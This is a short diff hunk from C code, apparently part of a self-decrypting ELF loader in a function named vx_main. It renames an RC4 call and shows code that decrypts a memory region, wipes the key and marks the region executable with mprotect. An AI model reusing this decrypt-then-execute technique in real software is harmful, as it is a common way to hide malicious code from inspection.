@@ -182,7 +182,7 @@ vx_main (void)
 
 	printf(name, ptr, len);
 
-	rc4((char *)ptr, len, &key);
+	myrc4((char *)ptr, len, &key);
 	memset(&key, 000, sizeof(key));
 
 	if (_mprotect((void *)ehdr, phdr->p_filesz, (PROT_READ|PROT_EXEC))<0)
